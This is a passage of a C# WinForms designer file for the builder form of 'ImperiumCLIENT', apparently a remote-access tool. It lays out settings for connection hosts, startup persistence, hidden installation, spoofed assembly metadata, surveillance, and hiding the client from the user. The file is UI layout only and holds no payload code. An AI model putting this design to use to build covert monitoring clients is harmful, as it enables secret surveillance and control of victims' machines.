namespace ImperiumCLIENT.Forms
{
    partial class BuilderForm
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BuilderForm));
            this.BTN_BuildClient = new System.Windows.Forms.Button();
            this.CMS_LB_ConnectionHosts = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.TSMI_Remove = new System.Windows.Forms.ToolStripMenuItem();
            this.TMSI_Clear = new System.Windows.Forms.ToolStripMenuItem();
            this.TC_Builder = new ImperiumCLIENT.Controls.DotNetBarTabControl();
            this.TP_BasicSettings = new System.Windows.Forms.TabPage();
            this.GB_RandomMutex = new System.Windows.Forms.GroupBox();
            this.BTN_RandomMutexGenerator = new System.Windows.Forms.Button();
            this.TB_RandomMutex = new System.Windows.Forms.TextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.LBL_UniqueMutex = new System.Windows.Forms.Label();
            this.GB_ClientTag = new System.Windows.Forms.GroupBox();
            this.TB_ClientTag = new System.Windows.Forms.TextBox();
            this.LBL_ClientTag = new System.Windows.Forms.Label();
            this.LBL_ATagSoYouCanIndenitfyYourClient = new System.Windows.Forms.Label();
            this.TP_ConnectionSettings = new System.Windows.Forms.TabPage();
            this.GB_ReconnectionDelay = new System.Windows.Forms.GroupBox();
            this.LBL_ms = new System.Windows.Forms.Label();
            this.NUD_WaitInbetweenReconnectionTries = new System.Windows.Forms.NumericUpDown();
            this.LBL_WaitInbetweenReconnectTries = new System.Windows.Forms.Label();
            this.GB_EncryptedConnection = new System.Windows.Forms.GroupBox();
            this.CB_ShowPassword = new System.Windows.Forms.CheckBox();
            this.TB_EncryptedPassword = new System.Windows.Forms.TextBox();
            this.LBL_PasswordForEncryptedConnection = new System.Windows.Forms.Label();
            this.LBL_EncryptedConnection = new System.Windows.Forms.Label();
            this.GB_ConnectionHosts = new System.Windows.Forms.GroupBox();
            this.BTN_AddHost = new System.Windows.Forms.Button();
            this.TB_IPHostname = new System.Windows.Forms.TextBox();
            this.NUD_Port = new System.Windows.Forms.NumericUpDown();
            this.LBL_Port = new System.Windows.Forms.Label();
            this.LBL_IPHostname = new System.Windows.Forms.Label();
            this.LB_ConnectionHosts = new System.Windows.Forms.ListBox();
            this.TP_Installation = new System.Windows.Forms.TabPage();
            this.GB_AddToStartUp = new System.Windows.Forms.GroupBox();
            this.TB_StartUpName = new System.Windows.Forms.TextBox();
            this.LBL_StartUpName = new System.Windows.Forms.Label();
            this.CB_StartWhenWindowsStarts = new System.Windows.Forms.CheckBox();
            this.GB_InstallationLocation = new System.Windows.Forms.GroupBox();
            this.PB_UAC2 = new System.Windows.Forms.PictureBox();
            this.PB_UAC = new System.Windows.Forms.PictureBox();
            this.CB_SetSubDirectoryToHidden = new System.Windows.Forms.CheckBox();
            this.CB_SetFileAttributeHidden = new System.Windows.Forms.CheckBox();
            this.LBL_Exe = new System.Windows.Forms.Label();
            this.TB_Name = new System.Windows.Forms.TextBox();
            this.TB_SubDirectory = new System.Windows.Forms.TextBox();
            this.LBL_Name = new System.Windows.Forms.Label();
            this.LBL_InstallSubdirectory = new System.Windows.Forms.Label();
            this.RB_System = new System.Windows.Forms.RadioButton();
            this.RB_ProgramFiles = new System.Windows.Forms.RadioButton();
            this.RB_UserAppData = new System.Windows.Forms.RadioButton();
            this.LBL_InstallDirectory = new System.Windows.Forms.Label();
            this.CB_InstallClient = new System.Windows.Forms.CheckBox();
            this.TP_AssemblySettings = new System.Windows.Forms.TabPage();
            this.TP_SurveillanceSettings = new System.Windows.Forms.TabPage();
            this.GB_AssemblyInformation = new System.Windows.Forms.GroupBox();
            this.LBL_ProductName = new System.Windows.Forms.Label();
            this.checkBox1 = new System.Windows.Forms.CheckBox();
            this.LBL_Description = new System.Windows.Forms.Label();
            this.LBL_CompanyName = new System.Windows.Forms.Label();
            this.LBL_Copyright = new System.Windows.Forms.Label();
            this.LBL_TradeMarks = new System.Windows.Forms.Label();
            this.TB_ProductName = new System.Windows.Forms.TextBox();
            this.TB_Description = new System.Windows.Forms.TextBox();
            this.TB_CompanyName = new System.Windows.Forms.TextBox();
            this.TB_Copyright = new System.Windows.Forms.TextBox();
            this.TB_Trademarks = new System.Windows.Forms.TextBox();
            this.LBL_OriginalFilename = new System.Windows.Forms.Label();
            this.TB_OriginalFilename = new System.Windows.Forms.TextBox();
            this.TB_FileName = new System.Windows.Forms.TextBox();
            this.LBL_FileVersion = new System.Windows.Forms.Label();
            this.TB_ProductVersion = new System.Windows.Forms.TextBox();
            this.LBL_ProductVersion = new System.Windows.Forms.Label();
            this.GB_Serveillance = new System.Windows.Forms.GroupBox();
            this.checkBox2 = new System.Windows.Forms.CheckBox();
            this.TP_Miscellaneous = new System.Windows.Forms.TabPage();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.CB_HideClientFromUser = new System.Windows.Forms.CheckBox();
            this.CB_RespawnIfClosed = new System.Windows.Forms.CheckBox();
            this.CMS_LB_ConnectionHosts.SuspendLayout();
            this.TC_Builder.SuspendLayout();
            this.TP_BasicSettings.SuspendLayout();
            this.GB_RandomMutex.SuspendLayout();
            this.GB_ClientTag.SuspendLayout();
            this.TP_ConnectionSettings.SuspendLayout();
            this.GB_ReconnectionDelay.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.NUD_WaitInbetweenReconnectionTries)).BeginInit();
            this.GB_EncryptedConnection.SuspendLayout();
            this.GB_ConnectionHosts.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.NUD_Port)).BeginInit();
            this.TP_Installation.SuspendLayout();
            this.GB_AddToStartUp.SuspendLayout();
            this.GB_InstallationLocation.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.PB_UAC2)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.PB_UAC)).BeginInit();
            this.TP_AssemblySettings.SuspendLayout();
            this.TP_SurveillanceSettings.SuspendLayout();
            this.GB_AssemblyInformation.SuspendLayout();
            this.GB_Serveillance.SuspendLayout();
            this.TP_Miscellaneous.SuspendLayout();
            this.groupBox1.SuspendLayout();
            this.SuspendLayout();
            // 
            // BTN_BuildClient
            // 
            this.BTN_BuildClient.Location = new System.Drawing.Point(636, 384);
            this.BTN_BuildClient.Name = "BTN_BuildClient";
            this.BTN_BuildClient.Size = new System.Drawing.Size(139, 27);
            this.BTN_BuildClient.TabIndex = 1;
            this.BTN_BuildClient.Text = "Build client";
            this.BTN_BuildClient.UseVisualStyleBackColor = true;
            // 
            // CMS_LB_ConnectionHosts
            // 
            this.CMS_LB_ConnectionHosts.ImageScalingSize = new System.Drawing.Size(20, 20);
            this.CMS_LB_ConnectionHosts.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.TSMI_Remove,
            this.TMSI_Clear});
            this.CMS_LB_ConnectionHosts.Name = "CMS_LB_ConnectionHosts";
            this.CMS_LB_ConnectionHosts.Size = new System.Drawing.Size(139, 56);
            // 
            // TSMI_Remove
            // 
            this.TSMI_Remove.Image = ((System.Drawing.Image)(resources.GetObject("TSMI_Remove.Image")));
            this.TSMI_Remove.Name = "TSMI_Remove";
            this.TSMI_Remove.Size = new System.Drawing.Size(138, 26);
            this.TSMI_Remove.Text = "Remove";
            this.TSMI_Remove.Click += new System.EventHandler(this.TSMI_Remove_Click);
            // 
            // TMSI_Clear
            // 
            this.TMSI_Clear.Image = ((System.Drawing.Image)(resources.GetObject("TMSI_Clear.Image")));
            this.TMSI_Clear.Name = "TMSI_Clear";
            this.TMSI_Clear.Size = new System.Drawing.Size(138, 26);
            this.TMSI_Clear.Text = "Clear";
            this.TMSI_Clear.Click += new System.EventHandler(this.TMSI_Clear_Click);
            // 
            // TC_Builder
            // 
            this.TC_Builder.Alignment = System.Windows.Forms.TabAlignment.Left;
            this.TC_Builder.Controls.Add(this.TP_BasicSettings);
            this.TC_Builder.Controls.Add(this.TP_ConnectionSettings);
            this.TC_Builder.Controls.Add(this.TP_Installation);
            this.TC_Builder.Controls.Add(this.TP_AssemblySettings);
            this.TC_Builder.Controls.Add(this.TP_SurveillanceSettings);
            this.TC_Builder.Controls.Add(this.TP_Miscellaneous);
            this.TC_Builder.ItemSize = new System.Drawing.Size(44, 136);
            this.TC_Builder.Location = new System.Drawing.Point(12, 12);
            this.TC_Builder.Multiline = true;
            this.TC_Builder.Name = "TC_Builder";
            this.TC_Builder.SelectedIndex = 0;
            this.TC_Builder.Size = new System.Drawing.Size(773, 366);
            this.TC_Builder.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
            this.TC_Builder.TabIndex = 0;
            // 
            // TP_BasicSettings
            // 
            this.TP_BasicSettings.Controls.Add(this.GB_RandomMutex);
            this.TP_BasicSettings.Controls.Add(this.GB_ClientTag);
            this.TP_BasicSettings.Location = new System.Drawing.Point(140, 4);
            this.TP_BasicSettings.Name = "TP_BasicSettings";
            this.TP_BasicSettings.Padding = new System.Windows.Forms.Padding(3);
            this.TP_BasicSettings.Size = new System.Drawing.Size(629, 358);
            this.TP_BasicSettings.TabIndex = 0;
            this.TP_BasicSettings.Text = "Basic";
            this.TP_BasicSettings.UseVisualStyleBackColor = true;
            // 
            // GB_RandomMutex
            // 
            this.GB_RandomMutex.Controls.Add(this.BTN_RandomMutexGenerator);
            this.GB_RandomMutex.Controls.Add(this.TB_RandomMutex);
            this.GB_RandomMutex.Controls.Add(this.label1);
            this.GB_RandomMutex.Controls.Add(this.LBL_UniqueMutex);
            this.GB_RandomMutex.Location = new System.Drawing.Point(7, 209);
            this.GB_RandomMutex.Name = "GB_RandomMutex";
            this.GB_RandomMutex.Size = new System.Drawing.Size(616, 143);
            this.GB_RandomMutex.TabIndex = 3;
            this.GB_RandomMutex.TabStop = false;
            this.GB_RandomMutex.Text = "Client tag";
            // 
            // BTN_RandomMutexGenerator
            // 
            this.BTN_RandomMutexGenerator.Location = new System.Drawing.Point(301, 82);
            this.BTN_RandomMutexGenerator.MaximumSize = new System.Drawing.Size(126, 28);
            this.BTN_RandomMutexGenerator.MinimumSize = new System.Drawing.Size(126, 28);
            this.BTN_RandomMutexGenerator.Name = "BTN_RandomMutexGenerator";
            this.BTN_RandomMutexGenerator.Size = new System.Drawing.Size(126, 28);
            this.BTN_RandomMutexGenerator.TabIndex = 3;
            this.BTN_RandomMutexGenerator.Text = "Random mutex";
            this.BTN_RandomMutexGenerator.UseVisualStyleBackColor = true;
            this.BTN_RandomMutexGenerator.Click += new System.EventHandler(this.BTN_RandomMutexGenerator_Click);
            // 
            // TB_RandomMutex
            // 
            this.TB_RandomMutex.Location = new System.Drawing.Point(144, 54);
            this.TB_RandomMutex.Name = "TB_RandomMutex";
            this.TB_RandomMutex.Size = new System.Drawing.Size(283, 22);
            this.TB_RandomMutex.TabIndex = 2;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(9, 54);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(106, 17);
            this.label1.TabIndex = 1;
            this.label1.Text = "Random mutex:";
            // 
            // LBL_UniqueMutex
            // 
            this.LBL_UniqueMutex.AutoSize = true;
            this.LBL_UniqueMutex.Font = new System.Drawing.Font("Microsoft Sans Serif", 7F);
            this.LBL_UniqueMutex.Location = new System.Drawing.Point(6, 18);
            this.LBL_UniqueMutex.Name = "LBL_UniqueMutex";
            this.LBL_UniqueMutex.Size = new System.Drawing.Size(387, 15);
            this.LBL_UniqueMutex.TabIndex = 0;
            this.LBL_UniqueMutex.Text = "An unique mutex so you can ensure there is only one instance running";
            // 
            // GB_ClientTag
            // 
            this.GB_ClientTag.Controls.Add(this.TB_ClientTag);
            this.GB_ClientTag.Controls.Add(this.LBL_ClientTag);
            this.GB_ClientTag.Controls.Add(this.LBL_ATagSoYouCanIndenitfyYourClient);
            this.GB_ClientTag.Location = new System.Drawing.Point(7, 7);
            this.GB_ClientTag.Name = "GB_ClientTag";
            this.GB_ClientTag.Size = new System.Drawing.Size(616, 176);
            this.GB_ClientTag.TabIndex = 0;
            this.GB_ClientTag.TabStop = false;
            this.GB_ClientTag.Text = "Client tag";
            // 
            // TB_ClientTag
            // 
            this.TB_ClientTag.Location = new System.Drawing.Point(144, 54);
            this.TB_ClientTag.Name = "TB_ClientTag";
            this.TB_ClientTag.Size = new System.Drawing.Size(283, 22);
            this.TB_ClientTag.TabIndex = 2;
            this.TB_ClientTag.Text = "Employee-01";
            // 
            // LBL_ClientTag
            // 
            this.LBL_ClientTag.AutoSize = true;
            this.LBL_ClientTag.Location = new System.Drawing.Point(9, 54);
            this.LBL_ClientTag.Name = "LBL_ClientTag";
            this.LBL_ClientTag.Size = new System.Drawing.Size(71, 17);
            this.LBL_ClientTag.TabIndex = 1;
            this.LBL_ClientTag.Text = "Client tag:";
            // 
            // LBL_ATagSoYouCanIndenitfyYourClient
            // 
            this.LBL_ATagSoYouCanIndenitfyYourClient.AutoSize = true;
            this.LBL_ATagSoYouCanIndenitfyYourClient.Font = new System.Drawing.Font("Microsoft Sans Serif", 7F);
            this.LBL_ATagSoYouCanIndenitfyYourClient.Location = new System.Drawing.Point(6, 18);
            this.LBL_ATagSoYouCanIndenitfyYourClient.Name = "LBL_ATagSoYouCanIndenitfyYourClient";
            this.LBL_ATagSoYouCanIndenitfyYourClient.Size = new System.Drawing.Size(204, 15);
            this.LBL_ATagSoYouCanIndenitfyYourClient.TabIndex = 0;
            this.LBL_ATagSoYouCanIndenitfyYourClient.Text = "A tag so you can indenitify your client";
            // 
            // TP_ConnectionSettings
            // 
            this.TP_ConnectionSettings.Controls.Add(this.GB_ReconnectionDelay);
            this.TP_ConnectionSettings.Controls.Add(this.GB_EncryptedConnection);
            this.TP_ConnectionSettings.Controls.Add(this.GB_ConnectionHosts);
            this.TP_ConnectionSettings.Location = new System.Drawing.Point(140, 4);
            this.TP_ConnectionSettings.Name = "TP_ConnectionSettings";
            this.TP_ConnectionSettings.Padding = new System.Windows.Forms.Padding(3);
            this.TP_ConnectionSettings.Size = new System.Drawing.Size(629, 358);
            this.TP_ConnectionSettings.TabIndex = 1;
            this.TP_ConnectionSettings.Text = "Connection";
            this.TP_ConnectionSettings.UseVisualStyleBackColor = true;
            // 
            // GB_ReconnectionDelay
            // 
            this.GB_ReconnectionDelay.Controls.Add(this.LBL_ms);
            this.GB_ReconnectionDelay.Controls.Add(this.NUD_WaitInbetweenReconnectionTries);
            this.GB_ReconnectionDelay.Controls.Add(this.LBL_WaitInbetweenReconnectTries);
            this.GB_ReconnectionDelay.Location = new System.Drawing.Point(13, 286);
            this.GB_ReconnectionDelay.Name = "GB_ReconnectionDelay";
            this.GB_ReconnectionDelay.Size = new System.Drawing.Size(610, 66);
            this.GB_ReconnectionDelay.TabIndex = 2;
            this.GB_ReconnectionDelay.TabStop = false;
            this.GB_ReconnectionDelay.Text = "Reconnect delay";
            // 
            // LBL_ms
            // 
            this.LBL_ms.AutoSize = true;
            this.LBL_ms.Location = new System.Drawing.Point(535, 33);
            this.LBL_ms.Name = "LBL_ms";
            this.LBL_ms.Size = new System.Drawing.Size(26, 17);
            this.LBL_ms.TabIndex = 2;
            this.LBL_ms.Text = "ms";
            // 
            // NUD_WaitInbetweenReconnectionTries
            // 
            this.NUD_WaitInbetweenReconnectionTries.Location = new System.Drawing.Point(352, 27);
            this.NUD_WaitInbetweenReconnectionTries.Maximum = new decimal(new int[] {
            100000,
            0,
            0,
            0});
            this.NUD_WaitInbetweenReconnectionTries.Minimum = new decimal(new int[] {
            1,
            0,
            0,
            0});
            this.NUD_WaitInbetweenReconnectionTries.Name = "NUD_WaitInbetweenReconnectionTries";
            this.NUD_WaitInbetweenReconnectionTries.Size = new System.Drawing.Size(177, 22);
            this.NUD_WaitInbetweenReconnectionTries.TabIndex = 1;
            this.NUD_WaitInbetweenReconnectionTries.Value = new decimal(new int[] {
            5000,
            0,
            0,
            0});
            // 
            // LBL_WaitInbetweenReconnectTries
            // 
            this.LBL_WaitInbetweenReconnectTries.AutoSize = true;
            this.LBL_WaitInbetweenReconnectTries.Location = new System.Drawing.Point(6, 29);
            this.LBL_WaitInbetweenReconnectTries.Name = "LBL_WaitInbetweenReconnectTries";
            this.LBL_WaitInbetweenReconnectTries.Size = new System.Drawing.Size(242, 17);
            this.LBL_WaitInbetweenReconnectTries.TabIndex = 0;
            this.LBL_WaitInbetweenReconnectTries.Text = "Time to wait between reconnect tries:";
            // 
            // GB_EncryptedConnection
            // 
            this.GB_EncryptedConnection.Controls.Add(this.CB_ShowPassword);
            this.GB_EncryptedConnection.Controls.Add(this.TB_EncryptedPassword);
            this.GB_EncryptedConnection.Controls.Add(this.LBL_PasswordForEncryptedConnection);
            this.GB_EncryptedConnection.Controls.Add(this.LBL_EncryptedConnection);
            this.GB_EncryptedConnection.Location = new System.Drawing.Point(13, 176);
            this.GB_EncryptedConnection.Name = "GB_EncryptedConnection";
            this.GB_EncryptedConnection.Size = new System.Drawing.Size(610, 103);
            this.GB_EncryptedConnection.TabIndex = 1;
            this.GB_EncryptedConnection.TabStop = false;
            this.GB_EncryptedConnection.Text = "Encrypted connection";
            // 
            // CB_ShowPassword
            // 
            this.CB_ShowPassword.AutoSize = true;
            this.CB_ShowPassword.Location = new System.Drawing.Point(401, 74);
            this.CB_ShowPassword.Name = "CB_ShowPassword";
            this.CB_ShowPassword.Size = new System.Drawing.Size(128, 21);
            this.CB_ShowPassword.TabIndex = 3;
            this.CB_ShowPassword.Text = "Show password";
            this.CB_ShowPassword.UseVisualStyleBackColor = true;
            this.CB_ShowPassword.CheckedChanged += new System.EventHandler(this.CB_ShowPassword_CheckedChanged);
            // 
            // TB_EncryptedPassword
            // 
            this.TB_EncryptedPassword.Location = new System.Drawing.Point(239, 46);
            this.TB_EncryptedPassword.Name = "TB_EncryptedPassword";
            this.TB_EncryptedPassword.Size = new System.Drawing.Size(290, 22);
            this.TB_EncryptedPassword.TabIndex = 2;
            this.TB_EncryptedPassword.Text = "password123";
            this.TB_EncryptedPassword.UseSystemPasswordChar = true;
            // 
            // LBL_PasswordForEncryptedConnection
            // 
            this.LBL_PasswordForEncryptedConnection.AutoSize = true;
            this.LBL_PasswordForEncryptedConnection.Location = new System.Drawing.Point(6, 46);
            this.LBL_PasswordForEncryptedConnection.Name = "LBL_PasswordForEncryptedConnection";
            this.LBL_PasswordForEncryptedConnection.Size = new System.Drawing.Size(73, 17);
            this.LBL_PasswordForEncryptedConnection.TabIndex = 1;
            this.LBL_PasswordForEncryptedConnection.Text = "Password:";
            // 
            // LBL_EncryptedConnection
            // 
            this.LBL_EncryptedConnection.AutoSize = true;
            this.LBL_EncryptedConnection.Font = new System.Drawing.Font("Microsoft Sans Serif", 4.8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.LBL_EncryptedConnection.ForeColor = System.Drawing.Color.Red;
            this.LBL_EncryptedConnection.Location = new System.Drawing.Point(6, 18);
            this.LBL_EncryptedConnection.Name = "LBL_EncryptedConnection";
            this.LBL_EncryptedConnection.Size = new System.Drawing.Size(225, 12);
            this.LBL_EncryptedConnection.TabIndex = 0;
            this.LBL_EncryptedConnection.Text = "Always use the same password in the server settings";
            // 
            // GB_ConnectionHosts
            // 
            this.GB_ConnectionHosts.Controls.Add(this.BTN_AddHost);
            this.GB_ConnectionHosts.Controls.Add(this.TB_IPHostname);
            this.GB_ConnectionHosts.Controls.Add(this.NUD_Port);
            this.GB_ConnectionHosts.Controls.Add(this.LBL_Port);
            this.GB_ConnectionHosts.Controls.Add(this.LBL_IPHostname);
            this.GB_ConnectionHosts.Controls.Add(this.LB_ConnectionHosts);
            this.GB_ConnectionHosts.Location = new System.Drawing.Point(6, 6);
            this.GB_ConnectionHosts.Name = "GB_ConnectionHosts";
            this.GB_ConnectionHosts.Size = new System.Drawing.Size(617, 163);
            this.GB_ConnectionHosts.TabIndex = 0;
            this.GB_ConnectionHosts.TabStop = false;
            this.GB_ConnectionHosts.Text = "Connection hosts";
            // 
            // BTN_AddHost
            // 
            this.BTN_AddHost.Location = new System.Drawing.Point(397, 89);
            this.BTN_AddHost.Name = "BTN_AddHost";
            this.BTN_AddHost.Size = new System.Drawing.Size(139, 27);
            this.BTN_AddHost.TabIndex = 3;
            this.BTN_AddHost.Text = "Add host";
            this.BTN_AddHost.UseVisualStyleBackColor = true;
            this.BTN_AddHost.Click += new System.EventHandler(this.BTN_AddHost_Click);
            // 
            // TB_IPHostname
            // 
            this.TB_IPHostname.Location = new System.Drawing.Point(359, 22);
            this.TB_IPHostname.Name = "TB_IPHostname";
            this.TB_IPHostname.Size = new System.Drawing.Size(177, 22);
            this.TB_IPHostname.TabIndex = 4;
            // 
            // NUD_Port
            // 
            this.NUD_Port.Location = new System.Drawing.Point(359, 61);
            this.NUD_Port.Maximum = new decimal(new int[] {
            100000,
            0,
            0,
            0});
            this.NUD_Port.Minimum = new decimal(new int[] {
            1,
            0,
            0,
            0});
            this.NUD_Port.Name = "NUD_Port";
            this.NUD_Port.Size = new System.Drawing.Size(177, 22);
            this.NUD_Port.TabIndex = 3;
            this.NUD_Port.Value = new decimal(new int[] {
            473,
            0,
            0,
            0});
            // 
            // LBL_Port
            // 
            this.LBL_Port.AutoSize = true;
            this.LBL_Port.Location = new System.Drawing.Point(243, 61);
            this.LBL_Port.Name = "LBL_Port";
            this.LBL_Port.Size = new System.Drawing.Size(38, 17);
            this.LBL_Port.TabIndex = 2;
            this.LBL_Port.Text = "Port:";
            // 
            // LBL_IPHostname
            // 
            this.LBL_IPHostname.AutoSize = true;
            this.LBL_IPHostname.Location = new System.Drawing.Point(243, 22);
            this.LBL_IPHostname.Name = "LBL_IPHostname";
            this.LBL_IPHostname.Size = new System.Drawing.Size(92, 17);
            this.LBL_IPHostname.TabIndex = 1;
            this.LBL_IPHostname.Text = "IP/Hostname:";
            // 
            // LB_ConnectionHosts
            // 
            this.LB_ConnectionHosts.FormattingEnabled = true;
            this.LB_ConnectionHosts.ItemHeight = 16;
            this.LB_ConnectionHosts.Location = new System.Drawing.Point(7, 22);
            this.LB_ConnectionHosts.Name = "LB_ConnectionHosts";
            this.LB_ConnectionHosts.Size = new System.Drawing.Size(207, 132);
            this.LB_ConnectionHosts.TabIndex = 0;
            this.LB_ConnectionHosts.MouseDown += new System.Windows.Forms.MouseEventHandler(this.LB_ConnectionHosts_MouseDown);
            // 
            // TP_Installation
            // 
            this.TP_Installation.Controls.Add(this.GB_AddToStartUp);
            this.TP_Installation.Controls.Add(this.GB_InstallationLocation);
            this.TP_Installation.Location = new System.Drawing.Point(140, 4);
            this.TP_Installation.Name = "TP_Installation";
            this.TP_Installation.Padding = new System.Windows.Forms.Padding(3);
            this.TP_Installation.Size = new System.Drawing.Size(629, 358);
            this.TP_Installation.TabIndex = 2;
            this.TP_Installation.Text = "Installation";
            this.TP_Installation.UseVisualStyleBackColor = true;
            // 
            // GB_AddToStartUp
            // 
            this.GB_AddToStartUp.Controls.Add(this.TB_StartUpName);
            this.GB_AddToStartUp.Controls.Add(this.LBL_StartUpName);
            this.GB_AddToStartUp.Controls.Add(this.CB_StartWhenWindowsStarts);
            this.GB_AddToStartUp.Location = new System.Drawing.Point(7, 259);
            this.GB_AddToStartUp.Name = "GB_AddToStartUp";
            this.GB_AddToStartUp.Size = new System.Drawing.Size(616, 96);
            this.GB_AddToStartUp.TabIndex = 1;
            this.GB_AddToStartUp.TabStop = false;
            this.GB_AddToStartUp.Text = "Add to startup";
            // 
            // TB_StartUpName
            // 
            this.TB_StartUpName.Location = new System.Drawing.Point(218, 68);
            this.TB_StartUpName.Name = "TB_StartUpName";
            this.TB_StartUpName.Size = new System.Drawing.Size(302, 22);
            this.TB_StartUpName.TabIndex = 2;
            this.TB_StartUpName.Text = "ImperiumCLIENT startup";
            // 
            // LBL_StartUpName
            // 
            this.LBL_StartUpName.AutoSize = true;
            this.LBL_StartUpName.Location = new System.Drawing.Point(12, 76);
            this.LBL_StartUpName.Name = "LBL_StartUpName";
            this.LBL_StartUpName.Size = new System.Drawing.Size(97, 17);
            this.LBL_StartUpName.TabIndex = 1;
            this.LBL_StartUpName.Text = "Startup name:";
            // 
            // CB_StartWhenWindowsStarts
            // 
            this.CB_StartWhenWindowsStarts.AutoSize = true;
            this.CB_StartWhenWindowsStarts.Location = new System.Drawing.Point(15, 38);
            this.CB_StartWhenWindowsStarts.Name = "CB_StartWhenWindowsStarts";
            this.CB_StartWhenWindowsStarts.Size = new System.Drawing.Size(196, 21);
            this.CB_StartWhenWindowsStarts.TabIndex = 0;
            this.CB_StartWhenWindowsStarts.Text = "Start when Windows starts";
            this.CB_StartWhenWindowsStarts.UseVisualStyleBackColor = true;
            // 
            // GB_InstallationLocation
            // 
            this.GB_InstallationLocation.Controls.Add(this.PB_UAC2);
            this.GB_InstallationLocation.Controls.Add(this.PB_UAC);
            this.GB_InstallationLocation.Controls.Add(this.CB_SetSubDirectoryToHidden);
            this.GB_InstallationLocation.Controls.Add(this.CB_SetFileAttributeHidden);
            this.GB_InstallationLocation.Controls.Add(this.LBL_Exe);
            this.GB_InstallationLocation.Controls.Add(this.TB_Name);
            this.GB_InstallationLocation.Controls.Add(this.TB_SubDirectory);
            this.GB_InstallationLocation.Controls.Add(this.LBL_Name);
            this.GB_InstallationLocation.Controls.Add(this.LBL_InstallSubdirectory);
            this.GB_InstallationLocation.Controls.Add(this.RB_System);
            this.GB_InstallationLocation.Controls.Add(this.RB_ProgramFiles);
            this.GB_InstallationLocation.Controls.Add(this.RB_UserAppData);
            this.GB_InstallationLocation.Controls.Add(this.LBL_InstallDirectory);
            this.GB_InstallationLocation.Controls.Add(this.CB_InstallClient);
            this.GB_InstallationLocation.Location = new System.Drawing.Point(7, 7);
            this.GB_InstallationLocation.Name = "GB_InstallationLocation";
            this.GB_InstallationLocation.Size = new System.Drawing.Size(616, 246);
            this.GB_InstallationLocation.TabIndex = 0;
            this.GB_InstallationLocation.TabStop = false;
            this.GB_InstallationLocation.Text = "Installation location";
            // 
            // PB_UAC2
            // 
            this.PB_UAC2.Image = ((System.Drawing.Image)(resources.GetObject("PB_UAC2.Image")));
            this.PB_UAC2.Location = new System.Drawing.Point(497, 105);
            this.PB_UAC2.Name = "PB_UAC2";
            this.PB_UAC2.Size = new System.Drawing.Size(84, 24);
            this.PB_UAC2.TabIndex = 13;
            this.PB_UAC2.TabStop = false;
            // 
            // PB_UAC
            // 
            this.PB_UAC.Image = ((System.Drawing.Image)(resources.GetObject("PB_UAC.Image")));
            this.PB_UAC.Location = new System.Drawing.Point(497, 81);
            this.PB_UAC.Name = "PB_UAC";
            this.PB_UAC.Size = new System.Drawing.Size(84, 48);
            this.PB_UAC.TabIndex = 12;
            this.PB_UAC.TabStop = false;
            // 
            // CB_SetSubDirectoryToHidden
            // 
            this.CB_SetSubDirectoryToHidden.AutoSize = true;
            this.CB_SetSubDirectoryToHidden.Enabled = false;
            this.CB_SetSubDirectoryToHidden.Location = new System.Drawing.Point(298, 210);
            this.CB_SetSubDirectoryToHidden.Name = "CB_SetSubDirectoryToHidden";
            this.CB_SetSubDirectoryToHidden.Size = new System.Drawing.Size(263, 21);
            this.CB_SetSubDirectoryToHidden.TabIndex = 11;
            this.CB_SetSubDirectoryToHidden.Text = "Set sub directory attributes to hidden";
            this.CB_SetSubDirectoryToHidden.UseVisualStyleBackColor = true;
            // 
            // CB_SetFileAttributeHidden
            // 
            this.CB_SetFileAttributeHidden.AutoSize = true;
            this.CB_SetFileAttributeHidden.Enabled = false;
            this.CB_SetFileAttributeHidden.Location = new System.Drawing.Point(12, 210);
            this.CB_SetFileAttributeHidden.Name = "CB_SetFileAttributeHidden";
            this.CB_SetFileAttributeHidden.Size = new System.Drawing.Size(199, 21);
            this.CB_SetFileAttributeHidden.TabIndex = 10;
            this.CB_SetFileAttributeHidden.Text = "Set file attributes to hidden";
            this.CB_SetFileAttributeHidden.UseVisualStyleBackColor = true;
            // 
            // LBL_Exe
            // 
            this.LBL_Exe.AutoSize = true;
            this.LBL_Exe.Location = new System.Drawing.Point(527, 177);
            this.LBL_Exe.Name = "LBL_Exe";
            this.LBL_Exe.Size = new System.Drawing.Size(34, 17);
            this.LBL_Exe.TabIndex = 9;
            this.LBL_Exe.Text = ".exe";
            // 
            // TB_Name
            // 
            this.TB_Name.Enabled = false;
            this.TB_Name.Location = new System.Drawing.Point(218, 173);
            this.TB_Name.Name = "TB_Name";
            this.TB_Name.Size = new System.Drawing.Size(302, 22);
            this.TB_Name.TabIndex = 8;
            this.TB_Name.Text = "Client";
            // 
            // TB_SubDirectory
            // 
            this.TB_SubDirectory.Enabled = false;
            this.TB_SubDirectory.Location = new System.Drawing.Point(218, 138);
            this.TB_SubDirectory.Name = "TB_SubDirectory";
            this.TB_SubDirectory.Size = new System.Drawing.Size(302, 22);
            this.TB_SubDirectory.TabIndex = 7;
            this.TB_SubDirectory.Text = "ImperiumClient";
            // 
            // LBL_Name
            // 
            this.LBL_Name.AutoSize = true;
            this.LBL_Name.Location = new System.Drawing.Point(9, 173);
            this.LBL_Name.Name = "LBL_Name";
            this.LBL_Name.Size = new System.Drawing.Size(130, 17);
            this.LBL_Name.TabIndex = 6;
            this.LBL_Name.Text = "Install subdirectory:";
            // 
